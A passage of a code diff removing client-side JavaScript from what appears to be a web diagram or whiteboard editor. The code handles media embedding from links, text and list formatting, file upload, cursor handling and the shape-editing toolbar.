-                return '<img src="' + link + '" width=' + xs[1] + "   >";
-
-        }
-        if (xs[1] != '' && !isNaN(xs[1]) && parseInt(xs[1])>1)
-            return '<img src="' + link + '" width=' + xs[1] + ">";
-        else
-            return '<img src="' + link + '"  >';
-    }
-    else if (xs[0] == '2')
-    {
-        if (ismakingtab!=1)
-        {
-            link = originalurl + "/image/giphy.gif";
-            xs[1] = Math.round(ismakingtab*parseFloat(xs[1]));
-        }
-        return '<iframe style="margin:4px 4px 4px 4px" src="' + link + '" width=' + xs[1] + " height=" + xs[1] + ">";
-    }
-    else if (xs[0] == '3')
-    {
-        if (ismakingtab!=1)
-        {
-            link = originalurl + "/image/index.gif";
-            xs[1] = Math.round(ismakingtab*parseFloat(xs[1]));
-            return '<img src="' + link + '" width=' + xs[1] + ">";
-        }
-        if (link.indexOf('.mp4')>0)
-          link = '<video  width=' + xs[1] + ' controls><source  src="' + link + '" type=video/mp4 /></video>';
-        else if (link.indexOf('youtu')>0 || link.indexOf('youku')>0)
-          link =  '<iframe  style="margin:4px 4px 4px 4px"  src="' + link.replace(/watch\?v=/,'embed/') + '" width=' + xs[1] + " height=" + Math.round(0.5625*parseInt(xs[1])) + " style=border:0px >";
-        return  link;
-    }
-    else if (xs[0] == '4')
-    {
-         if (ismakingtab!=1)
-        {
-            return 'sound clip';
-        }
-         link = '<embed src="' + link + '" width=200 height=25></embed>';
-
-        return  link  ;
-    }
-    else if (xs[0] == '5')
-    {
-        return '<a href="' + link + '" target=_blank>' + link + '</a>';
-    }
-    return link;
-}
-function foldto(x, l)
-{
-    return "<div style=\"overflow-wrap:break-word;word-wrap:break-word;-ms-word-break: break-all;word-break: break-all;word-break: break-word;ms-hyphens: auto;"
- + "-moz-hyphens: auto;-webkit-hyphens: auto;hyphens: auto;\">" + x + "</div>";
-    var y = '';
-    var i = 0;
-    while (true)
-    {
-        if (i + l < x.length)
-        {
-            y += x.substring(i, i+l) + '<br>';
-        }
-        else
-        {
-            y += x.substring(i, x.length);
-            return y;
-        }
-        i += l;
-    }
-}
-function mergelink(v,urlas)
-{
-   if(urlas==null) return '';
-   var tail = '';
-   if (urlas.indexOf('HTML')>=0) tail ='HTML';
-   else if (urlas.indexOf('LaTex')>=0) tail = 'LaText';
-   urlas = urlas.replace(/HTML/,'').replace(/LaTex/,'');
-   var urlarr = urlas.split(/\|/);
-   var x = '';
-   var r = new RegExp(/[ |"|'|\]|\[|\(|\)|\{|\}|\n|\r|\t|<]/);
-   var k = 0;
-   var K = 0;
-   var link;
-   var z = '';
-   var edt = $('t' + numbeing);
-   var needp = (edt!=null && edt.getElementsByTagName('table')[0].rows.length==2 );
-   var  urlasnew ='';
-   var ttype = 0;
-   if (needp && typeof(guessFormat)!='undefined')
-       ttype=guessFormat($('e' + numbeing).value);
-
-   while (k < v.length)
-   {
-       var j = v.indexOf('http://',k);
-       if (j == -1) j = v.indexOf('https://',k);
-       if (j == -1)
-       {
-           z += v.substring(k);
-           break;
-       }
-       var q = urlarr[K];
-       if (urlasnew != '') urlasnew += '|';
-       urlasnew += q;
-       if (q == null) q= '';
-       var w = asoption(urlas,K);
-       var m = r.exec(v.substring(j));
-       if (m == null)
-           link = v.substring(j);
-       else
-           link = v.substring(j, m.index+j);
-       if (j < 6 || v.substring(j-6, j).toLowerCase().indexOf("src=") <0 && v.substring(j-6, j).toLowerCase().indexOf("href=") <0)
-       {
-           if (needp)
-           {
-               var ll = w.replace(/<[^>]+>/g, "").length + 240;
-               x += '<tr bgcolor=lightyellow><td width=100% >' + foldto(link,ll) + "</td></tr><tr><td  width=100% >" + w + "</td></tr><tr><td bgcolor=transparent></td></tr>";
-           }
-           var e = link;
-           if ( ismakingtab != 1)
-           {
-               if (e.length > 8) e = e.substring(0,8)+"...";
-           }
-           else
-              e = makemultmedia(link,q);
-
-           z += v.substring(k, j) + e;
-       }
-       k  = link.length + j;
-       K++;
-   }
-   var x1='';
-   if (ishtml(v))
-      x1 = '<div style="margin:2px 2px 2px 2px;border:1px #999999 solid;"><table  cellspacing=0 cellpadding=3 style="margin:0px 3px 0px 0px;border-radius:0px"><tr><td width=50><nobr><b>' 
-      + textmsg[156] 
-      + '</b></nobr></td><td   align=left style="padding:0px 8px 0px 0px"><input name=wordformat style=background-color:#bbb onclick=changeformat('
-      + numbeing 
-      + ',0) type=radio value=0 ' 
-      + (tail==''?'checked':'') 
-      + '>' 
-      + textmsg[1608] 
-      + '</td><td  style="padding:0px 8px 0px 0px" align=left><input name=wordformat  type=radio  style=background-color:#bbb  onclick=changeformat('
-      + numbeing 
-      + ',1)  value=1 ' 
-      + (tail=='HTML'?'checked':'') 
-      + '>HTML</td><td  style="padding:0px 8px 0px 0px" align=left><input name=wordformat value=2  type=radio  style=background-color:#bbb  onclick=changeformat('+numbeing +',2) ' + (tail=='LaTex'?'checked':'') 
-      + ">LaTex</td></tr></table></div>";
-
-   if (needp && (x!='' || x1!=''))
-   {
-       var x2 = '';
-       if (x!='') x2 =   textmsg[1777]+'<div style="margin:2px 2px 2px 2px;border:1px #999999 solid;"><table width=100%  cellspacing=0 cellpadding=3 style="margin:0px;border:1px #999999 solid;border-radius:0px">' + x + "</table></div>";
-       if (x1!='') x2 += x1;
-       //myprompt(x2,null,null,textmsg[1634]);
-       var tbl = $('t'+numbeing).getElementsByTagName('table')[0];
-       var r = tbl.insertRow(1);
-       var c = r.insertCell(-1);
-       c.innerHTML = x2;
-       c.style.cssText ='font-size:14px;font-weight:400;background-color:#bbb';
-       allShapes[numbeing].urlas = urlasnew + tail;
-   }
-   return z;
-}
-
-
-
-function changeformat(num,n)
-{
-    var t = ''+n;
-    var x = allShapes[numbeing].urlas;
-    if (t == '0')
-    {
-        if (x.indexOf('HTML')>=0) allShapes[numbeing].urlas = allShapes[numbeing].urlas.replace(/HTML/,'');
-        if (x.indexOf('LaTex')>=0) allShapes[numbeing].urlas = allShapes[numbeing].urlas.replace(/LaTex/,'');
-    }
-    else if (t == '1')
-    {
-        if (x.indexOf('LaTex')>=0) allShapes[numbeing].urlas = allShapes[numbeing].urlas.replace(/LaTex/,'');
-        if (x.indexOf('HTML')== -1) allShapes[numbeing].urlas += "HTML";
-    }
-    else if (t == '2')
-    {
-        if (x.indexOf('HTML')>=0) allShapes[numbeing].urlas = allShapes[numbeing].urlas.replace(/HTML/,'');
-        if (x.indexOf('LaTex')== -1) allShapes[numbeing].urlas += "LaTex";
-    }
-}
-
-function chooseurlas( K,i)
-{
-    var ttype='';
-    if (allShapes[numbeing].urlas.indexOf('HTML')>=0)
-    {
-        allShapes[numbeing].urlas = allShapes[numbeing].urlas.replace(/HTML/,'');
-        ttype ='HTML';
-    } else if (allShapes[numbeing].urlas.indexOf('LaTex')>=0)
-    {
-        allShapes[numbeing].urlas = allShapes[numbeing].urlas.replace(/LaTex/,'');
-        ttype ='LaTex';
-    }
-
-    var urlarr = allShapes[numbeing].urlas.split(/\|/);
-    var q = $('width' + K);
-    q.style.visibility=  (i<4?'visible':'hidden');
-    var wv = '';
-    if ( i < 7)
-    {
-        var w = q.getElementsByTagName('table')[0].rows[0].cells[1].getElementsByTagName('input')[0];
-        var wv = urlarr[K];
-        if (wv == null) wv = '';
-        var j = wv.indexOf('_');
-        if (j == -1)
-            wv = '';
-        else
-            wv = wv.substring(j+1);
-        if ( (i==2 || i==3))
-        {
-            if (  wv=='' || isNaN(wv) )
-            {
-
-                if (w.value =='' || isNaN(w.value) || parseInt(w.value) < 1)
-                   wv = w.value = '500';
-                else
-                   wv = w.value;
-            }
-            else
-            {
-                if (w.value =='' || isNaN(w.value) || parseInt(w.value) < 1)
-                    w.value = wv;
-            }
-        }
-        else if (i==1)
-        {
-            if (  wv=='' || isNaN(wv) )
-            {
-               if (w.value =='' || isNaN(w.value) || parseInt(w.value) < 1)
-                   wv = w.value = '';
-                else
-                   wv = w.value;
-            }
-            else
-            {
-                if (w.value =='' || isNaN(w.value) || parseInt(w.value) < 1)
-                    w.value = wv;
-            }
-        }
-
-    }
-
-    var urlasnew = '';
-    for (var j=0; j < urlarr.length; j++)
-    {
-      if (j > 0) urlasnew += "|";
-      if (j != K)
-        urlasnew +=   urlarr[j];
-      else
-        urlasnew +=  i + (wv==''?'':'_')  +  wv;
-    }
-    allShapes[numbeing].urlas = urlasnew + ttype;
-  
-}
-function dourlaswidth(td, K)
-{
-    var ttype='';
-    if (allShapes[numbeing].urlas.indexOf('HTML')>=0)
-    {
-        allShapes[numbeing].urlas = allShapes[numbeing].urlas.replace(/HTML/,'');
-        ttype ='HTML';
-    } else if (allShapes[numbeing].urlas.indexOf('LaTex')>=0)
-    {
-        allShapes[numbeing].urlas = allShapes[numbeing].urlas.replace(/LaTex/,'');
-        ttype ='LaTex';
-    }
-    var urlarr = allShapes[numbeing].urlas.split(/\|/);
-    var urlasnew = '';
-    var wv = td.value;
-    var z = urlarr[K].split(/_/)[1];
-    var p = urlarr[K].split(/_/)[0];
-
-    if (K == 2 || K == 3)
-    {
-        if (wv == '' || isNaN(wv))
-            t.value = wv =(z==''||z==null||isNaN(z))? '500':z;
-        else
-            z = wv;
-    }
-    else if (K == 1)
-    {
-        if (wv == '' || isNaN(wv))
-            t.value = wv =(z==null||z==''||isNaN(z))? '':z;
-        else
-            z = wv;
-    }
-
-    for (var i=0; i < urlarr.length; i++)
-    {
-      if (i > 0) urlasnew += "|";
-      if (i != K)
-        urlasnew +=   urlarr[i];
-      else
-        urlasnew +=   p + (td.value==''?'':'_')  + td.value;
-    }
-    var t = allShapes[numbeing];
-    t.urlas = urlasnew + ttype;
-   
-}
-
-function drawlinein(x0, y0, x1, y1, thick,color)
-{
-    var str = '<div style="';
-
-    if (Math.abs(x1-x0) > Math.abs(y1-y0) )
-    {
-        var width = Math.sqrt((y1-y0)*(y1-y0) + (x1-x0)*(x1-x0));
-        var left = x0 + (x1-x0)/2 - width/2 + thick/2;
-        var top =  y0 + (y1-y0)/2 ;
-        var height = thick;
-        var deg  =   Math.atan2(y1-y0 , x1-x0 )*180/3.14159265;
-        str +=  'position:relative;left:'
-        + left + 'px;top:'
-        + top +  'px;width:'
-        + width + 'px;height:'
-        + height + "px;background-color:" +  color  + ';-ms-transform: rotate(' + deg
-        + 'deg);-webkit-transform: rotate('+ deg + 'deg);transform: rotate('  + deg + 'deg);padding:0px 0px 0px 0px;margin:0px 0px 0px 0px;font-size:1px';
-
-    }
-    else //if (Math.abs(x1-x0) < Math.abs(y1-y0) )
-    {
-        var height = Math.sqrt((y1-y0)*(y1-y0) + (x1-x0)*(x1-x0));
-        var left = x0 + (x1-x0)/2;
-        var top =  y0 + (y1-y0)/2 - height/2 + thick/2;
-        var width = thick;
-        var deg  = -Math.atan2(x1 -x0,y1 -y0)*180/3.14159265;
-        str += 'position:relative;left:'
-        + left + 'px;top:'
-        + top +  'px;width:'
-        + width + 'px;height:'
-        + height + "px;background-color:" +  color + ';-ms-transform: rotate(' + deg
-        + 'deg);-webkit-transform: rotate('+ deg + 'deg);transform: rotate('  + deg + 'deg);padding:0px 0px 0px 0px;margin:0px 0px 0px 0px;font-size:1px';
-
-    }
-    return str +  '"><!--></div>';
-
-} 
-function asoption(urlas,K)
-{
-    if (urlas == null) return '';
-    var urlarr = urlas.split(/\|/);
-    var X = urlarr[K];
-    if (X == null || X =='') X = '6';
-    var Y = X.split(/_/);
-    if (Y[1] == null) Y[1] = '';
-    var xs = textmsg[1775].split(/@/);
-    var x = '<table border=0 cellspacing=0 cellpadding=0><tr ><td><nobr><b>' + xs[0] + "</b></nobr></td>";
-    for (var i=1; i < xs.length; i++)
-    {
-        var w = (Y[0]==''+i);
-        x += "<td><input onclick=\"chooseurlas(" + K + "," + i + ")\" name=opts" + K + " type=radio  style=background-color:#bbb value=\"" + i + "\" " + (w?'checked':'') + '></td><td style="padding:0px 8px 0px 0px"><nobr>' + xs[i] + "</nobr></td>";
-    }
-    x += '<td  id=width' + K + ' style=visibility:' + (parseInt(Y[0]) < 4?'visible':'hidden') + '><table cellspacing=0 cellpadding=0><tr ><td><nobr>' +textmsg[733] + "</nobr></td><td><input type=text name=aswidth size=3 value=\"" + Y[1] + "\" onchange=dourlaswidth(this,"+ K + ")></td><td>px</td></tr></table></td></tr></table>";
-    return x;
-}
-
-
-function dotable(str,cl)
-{
-    var x =(new CSVParse(str, '"', "\t", "\r\n")).tohtml().replace(/border\-collapse:/,'border:1px ' +cl + ' solid;border-collapse:').replace(/<td /g,'<td style=border-color:' +cl + ' ');
-
-    return x;
-}
-if (typeof(formatnolx) == 'undefined')
-   var formatnolx = null;
-
-formatnolx = function(v,cl, fmt)
-{
-    var j = v.indexOf("<img ");
-    if (j== 0) return v;
-    var j = v.indexOf("<iframe ");
-    if (j== 0) return v;
-    if (j < 0)
-    {
-      v = dotag(v,cl, fmt);
-      return v;
-    }
-
-    var y = v.substring(j);
-    v = v.substring(0,j);
-    v = dotag(v,cl, fmt);
-    j = v.lastIndexOf("<br>");
-    if (j < 0 || j>=0 && j < v.length-5)
-      return v + "<br>" + y;
-    return v + y;
-}
-function dotag(v,cl, fmt)
-{
-   var tag = ['oln', 'ola', 'ulb'];
-   for (var i=0; i < 3; i++)
-   {
-       var j = v.indexOf("<" + tag[i] + ">");
-       if (j>=0)
-       {
-          var k = v.indexOf("</" + tag[i] + ">",j);
-          var x = v.substring(0,j);
-          if (x.length>0 && x.charAt(x.length-1)!='\n')
-              x += "\n";
-          x = dotag(x,cl, fmt);
-          if (k >=0)
-          {
-              var y = dotag1(v.substring(j+ tag[i].length+2, k),tag,i,cl, fmt);
-              return x + y + dotag(v.substring(k+tag[i].length+3), cl, fmt);
-          }
-          return x   + dotag1(v.substring(j+ tag[i].length+2),tag, i,cl, fmt);
-       }
-   }
-
-   if (shapenamebeing== 'rightrect' || shapenamebeing== 'roundrect')
-   v =   v.replace(/\n[\r| ]*\n/g, "<br><div style=\"display:block;width:100%;height:2px;background-color:" + cl +"\"><!----></div>");
-
-   var arr = v.split(/\n/);
-   v= '';
-   for (i=0; i < arr.length; i++)
-   {
-      if (v!='') v += "<br>";
-      //v += "<nobr>" +  arr[i]  + "</nobr>";
-      v += arr[i];
-   }
-   return v;
-}
-function dotag1(v, tag,i,cl,  fmt)
-{
-
-   var arr = v.split("\n");
-   var base = '1a';
-
-   var s = '';
-   var k = 0;
-   for (var j=0; j <  arr.length; j++)
-   {
-       if (arr[j].length== 0)
-       {
-           s += '<br>';
-           continue;
-       }
-       else if (arr[j].charAt(0)== ' ' )
-       {
-           var rr = arr[j].replace(/^\s+/,'');
-           if (fmt == 0) rr = formatstr0old(rr,0);
-           s += "<nobr>" + diamschar +  rr  + "</nobr><br>";
-       }
-       else
-       {
-           var x = bullchar;
-           var rr = arr[j];
-           if (fmt==0) rr = formatstr0old(rr,0);
-           if (i < 2)
-               x = String.fromCharCode(base.charCodeAt(i) + k ) + ".";
-           s += "<nobr>" + x +  rr   + "</nobr>";
-           if ( j < arr.length-1) s += "<br>";
-           k++;
-       }
-   }
-
-   return s;
-}
-function uploadfile()
-{
-    saveit();
-    document.ff1.localpath.click();
-}
-var freference;
-function upload(f,num)
-{
-    freference = f;
-    beingloadnum = num;
-    submitstring = "upload(freference,beingloadnum)";
-    expiretime = activeidletime + (new Date()).getTime();
-    var xx;
-    if (chatsessionnum > -1)
-    {
-        f.subdb.value = parent.subdb;
-        f.subfolder.value = "chat";
-        formnewaction(f, "UploadComm");
-        f.subfolder.disabled = false;
-        f.saveindir.disabled = true;
-    }
-    else
-    {
-        f.action = "UploadFile";
-        f.saveindir.disabled = false;
-        f.subfolder.disabled = true;
-        xx = f.saveindir.value;
-    }
-
-    if (saveable())
-    {
-        f.saveindir.value = xx + "/image";
-        f.target = iframename ;
-       visual(f);
-       expiretime = activeidletime + (new Date()).getTime();
-       f.submit();
-        f.saveindir.value = xx;
-    }
-
-}
- 
-function addtab(num)
-{
-    var t = $('e' + num);
-    t.focus();
-    var j = caretPos(t);
-    var x = '';
-    if (j>0) x = t.value.substring(0,j);
-    t.value =  x + "\t"  + t.value.substring(j);
-
-}
-var cachedlinethick = 1;
-var cachedfontsize = '15px';
-var cachedbgcolor = 0;
-var cachedcolor = 0;
-function selectfontname(sel)
-{
-    cachedfontfamily = sel.options[sel.selectedIndex].value;
-  
-}
-function changefsinousing(sel,num)
-{
-    var edt = $('e' + num);
-    var fs = parseInt(sel.options[sel.selectedIndex].text.replace(/px/,''));
-    edt.style.fontSize = fs + 'px';
-    allShapes[num].base.style.fontSize = fs + 'px';
-    allShapes[num].fontsize = fs;
-    cachedfontsize = edt.style.fontSize;
-}
-function addtilde(id)
-{
-    var x = $(id);
-    var y = getCursorPos(x)+1;
-    x.value   = x.value.substring(0, y ) + "\t" + x.value.substring(y);
-    setCursorPos(x,y+1);
-}
-function setCursorPos(input, start, end) {
-    if (arguments.length < 3) end = start;
-    if ("selectionStart" in input) {
-        setTimeout(function() {
-            input.selectionStart = start;
-            input.selectionEnd = end;
-        }, 1);
-    }
-    else if (input.createTextRange) {
-        var rng = input.createTextRange();
-        rng.moveStart("character", start);
-        rng.collapse();
-        rng.moveEnd("character", end - start);
-        rng.select();
-    }
-}
-var xx;
-function getCursorPos(input) {
-    if ("selectionStart" in input && document.activeElement == input) {
-        return {
-            start: input.selectionStart,
-            end: input.selectionEnd
-        };
-    }
-    else if (input.createTextRange) {
-        var sel = document.selection.createRange();
-        if (sel.parentElement() === input) {
-            var rng = input.createTextRange();
-            rng.moveToBookmark(sel.getBookmark());
-            for (var len = 0;
-                     rng.compareEndPoints("EndToStart", rng) > 0;
-                     rng.moveEnd("character", -1)) {
-                len++;
-            }
-            rng.setEndPoint("StartToStart", input.createTextRange());
-            for (var pos = { start: 0, end: len };
-                     rng.compareEndPoints("EndToStart", rng) > 0;
-                     rng.moveEnd("character", -1)) {
-                pos.start++;
-                pos.end++;
-            }
-            return pos;
-        }
-    }
-    return -1;
-}
-function changeshapefontfamily(sel,num)
-{
-   allShapes[num].fontfamily = sel.options[sel.selectedIndex].value;
-   $('e' + num).style.fontFamily = allShapes[num].fontfamily;
-
-}
-function showedit(num,x,y,w,h,tt)
-{
-    var a ;
-    if (tt!=null)
-    {
-        if (w == null) w = favorw;
-        if (h == null) h = favorh;
-        a = $("a" + num);
-        if (a!=null) a.style.visibility = 'hidden';
-    }
-    var edt = document.createElement("div");
-    edt.id = "t" + num;
-    var fns = textmsg[1594].split(/@/);
-    var ffs =  "<select name=ff style=font-size:15px;background-color:#BBBBBB;font-weight:700 onchange=changeshapefontfamily(this," + num + ")>";    //var fns = textmsg[1594].split(/@/);
-    var ii = "";
-    if (tt!=null)
-    for(var  i =0; i < fns.length; i++)
-    {
-         if (allShapes[num]!=null && samefont(allShapes[num].fontfamily,fns[i]) || 
-         fns[i] + 'px' == cachedfontsize) ii = " selected "; else ii = "";
-         ffs += "<option value=\"" + fns[i] + "\" " + ii + " >" + fns[i].replace(/,.*/,'').replace(/ .*/,'') + "</option>";
-    }
-    ffs += "</select>";
-    var fml = 'arial'; if (allShapes[num]!=null) allShapes[num].fontfamily;
-    edt.style.cssText = "border-radius:4px;border:2px #444 solid;background-image:linear-gradient(-45deg,#ccc,#bbb,#999,#aaa);position:absolute;z-index:" + (2*numShapes+4) + ";left:" + x +"px;top:" + y +"px;";
-    var s = "<table cellpadding=0 cellspacing=0 border=0 align=center ><tr><td align=left><textarea  onkeydown=\"if(event.keyCode===9){var v=this.value,s=this.selectionStart,e=this.selectionEnd;this.value=v.substring(0, s)+'\t'+v.substring(e);this.selectionStart=this.selectionEnd=s+1;return false;}\"        id=\"e"
-    + num + "\" onfocus=\"if(typeof(onlinetoolbarfollow)!='undefined')textareatobesearch=this;\"  class=samebg style=\"background-color:white;border-radius:3px;border:1px #eee block;width:" + w +"px;height:" + h +"px;font-size:" + cachedfontsize + ";font-family:" + fml + "\"  onkeyup=getInputSelection(this)  onmouseout=getInputSelection(this)>" + (tt==null?'':tt) +"</textarea></td></tr>"
-    + "<tr><td  align=center  bgcolor=#bbb> <table cellspacing=0 cellpadding=0 border=0><tr>"
-    + "<td><div id=an" + num + " style=\"background-color:#dde;width:24px;height:24px;border-radius:12px;line-height:24px;text-align:center;vertial-align:middle;font-size:18px\">&#10021;</div></td>";
-    if (tt!=null)
-    {
-        s +="<td  style=\"background-color:#BBBBBB;border:1px #b0b0b0 outset;font-weight:700\" ><select  style=font-size:15px;background-color:#BBBBBB;font-weight:700  name=editfs onchange=changefsinousing(this,"+ num + ")><option " + (cachedfontsize=='15px'?'selected':'') + " value=15px>15px</option><option  " + (cachedfontsize=='25px'?'selected':'') + "  value=25px>25px</option><option  " + (cachedfontsize=='35px'?'selected':'') + " value=35px>35px</option><option  " + (cachedfontsize=='45px'?'selected':'') + "  value=45px>45px</option><option  " + (cachedfontsize=='55px'?'selected':'') + " value=55px>55px</option><option  " + (cachedfontsize=='70px'?'selected':'') + " value=70px>70px</option></select><td><input style=width:1px;height:1px;border:0px onfocus=addtab(" +num + ")></td><td style=\"background-color:#BBBBBB;border:1px #b0b0b0 outset;font-weight:700\" >";
-        s += "</td><td  style=\"background-color:#BBBBBB;border:1px #b0b0b0 outset;font-weight:700\" >" + ffs + "</td><td  id=helpbtn  onclick=helpstr(" + num +")          align=center   style=\"width:40px;overflow:hidden;font-size:12px;font-weight:bold;background-image:linear-gradient(-60deg,#bbb,#edf);border-radius:3px;background-color:#BBBBBB;border:1px #0b0b0b outset;\"><nobr>" + textmsg[17] + "</nobr></td>";
-        if (onlinetoolinitial.replace(/[^;]/g,'').length < 8 && onlinetoolinitial.indexOf('LaTex')>=0)
-        s+= "<td                                         align=center   style=\"width:40px;overflow:hidden;font-size:12px;font-weight:bold;border-radius:3px;background-image:linear-gradient(-60deg,#bbb,#edf);background-color:#BBBBBB;border:1px #0b0b0b outset;\"><span  onclick=\"showlatexpanel($('e" + num + "'),this)\">LaTex</span></td><td style=width:10px;overflow:hidden></td>";
-        else
-        s+= "<td                                         align=center   style=\"width:40px;overflow:hidden;font-size:12px;font-weight:bold;border-radius:3px;background-image:linear-gradient(-60deg,#bbb,#edf);background-color:#BBBBBB;border:1px #0b0b0b outset;\"><span  onclick=\"showonlinetool(" + num + ")\"><nobr>" + textmsg[1776] + "</nobr></span></td><td style=width:10px;overflow:hidden></td>";
-        s+= "<td    onclick=\"listf(" + num +",'b')\"    align=center   style=\"width:40px;overflow:hidden;font-size:12px;font-weight:bold;border-radius:3px;background-image:linear-gradient(-60deg,#bbb,#edf);background-color:#BBBBBB;border:1px #0b0b0b outset\"><nobr>" + textmsg[1592].replace(/ .*/,'') + "</nobr></td>"
-        s+= "<td    onclick=\"listf(" + num +",'pre')\"    align=center   style=\"width:40px;overflow:hidden;font-size:12px;font-weight:bold;border-radius:3px;background-image:linear-gradient(-60deg,#bbb,#edf);background-color:#BBBBBB;border:1px #0b0b0b outset\"><nobr>Pre</nobr></td>"
-        + "<td    onclick=\"listf(" + num +",'oln')\"  align=center   style=\"width:40px;overflow:hidden;font-size:12px;font-weight:bold;border-radius:3px;background-image:linear-gradient(-60deg,#bbb,#edf);background-color:#BBBBBB;border:1px #0b0b0b outset\"><nobr>1.2.3.</nobr></td>"
-        + "<td    onclick=\"listf(" + num +",'ola')\"  align=center   style=\"width:40px;overflow:hidden;font-size:12px;font-weight:bold;border-radius:3px;background-image:linear-gradient(-60deg,#bbb,#edf);background-color:#BBBBBB;border:1px #0b0b0b outset\">a.b.c.</td>"
-        + "<td    onclick=\"listf(" + num +",'ulb')\"  align=center   style=\"width:40px;overflow:hidden;font-size:12px;font-weight:bold;border-radius:3px;background-image:linear-gradient(-60deg,#bbb,#edf);background-color:#BBBBBB;border:1px #0b0b0b outset\">&bull;&bull;&bull;</td>"
-        + "<td    onclick=\"clearformat(" + num +")\"  align=center   style=\"width:40px;overflow:hidden;font-size:12px;font-weight:bold;border-radius:3px;background-image:linear-gradient(-60deg,#bbb,#edf);background-color:#BBBBBB;border:1px #0b0b0b outset\" ><nobr>" + textmsg[1663] + "</nobr></td><td style=width:10px;overflow:hidden></td>";
-        }
-    s +="<td  id=donebtn  onclick=done(" + num +")             align=center   style=\"width:40px;overflow:hidden;font-size:12px;font-weight:bold;border-radius:3px;background-image:linear-gradient(-60deg,#bbb,#edf);background-color:#BBBBBB;border:1px #0b0b0b outset\"><nobr>" + textmsg[1357] + "</nobr></td><td>"
-    + "<td    onclick=cancele(" + num +")          align=center   style=\"width:40px;overflow:hidden;font-size:12px;font-weight:bold;border-radius:3px;background-image:linear-gradient(-60deg,#bbb,#edf);background-color:#BBBBBB;border:1px #0b0b0b outset;\"><nobr>" + textmsg[18] + "</nobr></td>"
-    + "</tr></table></td></tr></table>";
-
-    edt.innerHTML =s;
-    document.body.appendChild(edt);
-    edt.onmouseover= function()
-    {
-        showanchor($("e" + num), $("t" + num), 'se');
-    }
-    Drag.init($("an" + num),edt);
-    if (tt!=null)
-    {
-        if (allShapes[num]!=null)
-            allShapes[num].inediting = true;
-        sendObject(num);
-        numbeing = num;
-    }
-    return edt;
-}
-function example(num)
-{
-    var x =  $('e' + num);
-    if (x.value == '' || x.value.length < 10)
-    x.value = "Math:$y=x^2$\n\nTable:\n11\tTab 12\n21\tTab 22\n\nImage:[" + textmsg[1303] + "1]\n[" + textmsg[1303] + "2:2] \n\nItemrize:\n<oln>Upload images\n\create imagelet from it</oln>"
-}
-function helpstr(num)
-{
-    var ex = '';
-    var x =  $('e' + num);
-    if (x.value == '' || x.value.length < 10)
-        ex = "<br><center><a   href=\"javascript:example("  + num + ")\"><b><font color=blue>" + textmsg[1322] + "</font></b></a></center>";
-    myprompt("<ol><li>" + textmsg[1664].replace(/\n/g, "<li>") + "</ol>" + ex,null,null,textmsg[17]);
-
-}
-function clearformat(num)
-{
-   var ta = $("e" + num);
-   ta.value = ta.value.replace(/<[a-z]+>/g,'').replace(/<\/[a-z]+>/g,'');
-}
-function listf(num,b)
-{
-    var tag = ["<" + b +">","</" + b + ">"];
-    var ta = $("e" + num);
-    var t  = ta.value.substring(selectstart, selectend);
-    var i =  selectstart;
-
-    if (t.indexOf(tag[0]) >= 0 || t.indexOf(tag[1]) >= 0)
-        return;
-
-    for (var k =0; k < 2; k++)
-    for (var j=1; j < tag[k].length; j++)
-    {
-
-        if (    i > j
-             && i < ta.value.length - tag[k].length + j
-             && ta.value.substring(i-j,i+tag[k].length-j)== tag[k]
-           )
-        {
-            i = i-j;
-
-        }
-
-    }
-
-    j = ta.value.substring(0,i).lastIndexOf(tag[1]);
-    k = ta.value.substring(0,i).lastIndexOf(tag[0]);
-
-    if (k>j  )
-    {
-        var l = ta.value.indexOf(tag[1],i);
-        var m = t.length + i;
-
-        if (m > l && l>0)
-          ta.value = ta.value.substring(0,i) +  tag[1] + ta.value.substring(i,l) + tag[0] + ta.value.substring(l+4,m) + tag[1] + ta.value.substring(m);
-        else if ( m < l)
-          ta.value = ta.value.substring(0,i) + tag[1] + ta.value.substring(i,m) + tag[0]+ ta.value.substring(m);
-    }
-    else if (k <= j  )
-    {
-         l = ta.value.indexOf(tag[0],i);
-         m = t.length + i;
-
-        if (m > l && l>0)
-          ta.value = ta.value.substring(0,i) +  tag[0] + ta.value.substring(i,l) + tag[1] + ta.value.substring(l+3,m) + tag[0] + ta.value.substring(m);
-        else
-          ta.value = ta.value.substring(0,i) + tag[0]  + ta.value.substring(i,m) + tag[1] + ta.value.substring(m);
-
-    }
-    ta.value = ta.value.replace(tag[0] + tag[1], '');
-}
-var numediting = -1;
-function action(dv,num)
-{
-    var x = 20;
-    var y = 20;
-    var tt = '';
-    var w =  null;
-    var h =  null;
-    if (allShapes[num]!=null) 
-        tt =  allShapes[num].words;
-    if (tt==null ) tt = '';
-    if (dv!=null)
-    {
-        LaTexHTML.deformat(dv);
-        num = parseInt(dv.id.substring(1));
-        
-        
-        if (allShapes[num].isrect())
-        {
-            x = allShapes[num].x + 4;
-            y = allShapes[num].y + 4;
-        }
-        else
-        {
-            x = parseInt(dv.style.left.replace(/px/,''));
-            y = parseInt(dv.style.top.replace(/px/,''));
-        }
-        dv.style.cssText =  allShapes[num].basiccss();
-        w =  dv.style.offsetWidth;
-        h =  dv.style.offsetHeight;
-    }
-    if (w==null || w < favorw)
-        w = favorw;
-    if (allShapes[num]!=null && allShapes[num].width != null)
-        w = allShapes[num].width;
-
-    if (h==null || h < favorh)
-        h = favorh;
-    if (allShapes[num]!=null && allShapes[num].height != null)
-        h = allShapes[num].height;
-    
-    var b = showedit(num,x,y,w,h,tt);
-    var ta = b.getElementsByTagName("textarea")[0];
-    if (typeof(onlinetoolbarfollow)!='undefined' && typeof(onlinetoolbase)!= 'undefined' && onlinetoolbase!=null)
-    {
-        onlinetoolbarfollow(ta);
-        ta.focus();
-    }
-
-    $('mobiletoolbar').style.zIndex = '' + (2*numShapes + 4);
-    if (b.offsetWidth > ta.offsetWidth+ 6)
-        ta.style.width = (b.offsetWidth - 6) + 'px';
-
-    numediting = num;
-}
-function cancele(num)
-{
-    allShapes[num].inediting = false;
-    sendObject(num);
-     if (typeof(onlinetoolbase)!='undefined')
-     {
-         onlinetoolbase.style.visibility = "hidden";
-     }
-    numediting = -1;
-    var b = $("t" + num);
-    document.body.removeChild(b);
-    document.onmousemove = onmouseover0;
-    hideanchor(num);
-    if (allShapes[num]==null)
-    ;
-    else if (num == numShapes-1 && allShapes[num].words.length<10 && allShapes[num].bcolor<9)
-    {
-        allShapes[num].delme(false);
-    }
-    else
-    {
-        allShapes[num].visible = 1;
-        allShapes[num].initbase();
-        allShapes[num].init();
-        allShapes[num].setup();
-        
-    }
-    
-}
-var numsselected1 = null;
-var moreslice = '';
-var moreslicesaved = '';
-function done(num, W, H, enforce)
-{
-    allShapes[num].inediting = false;
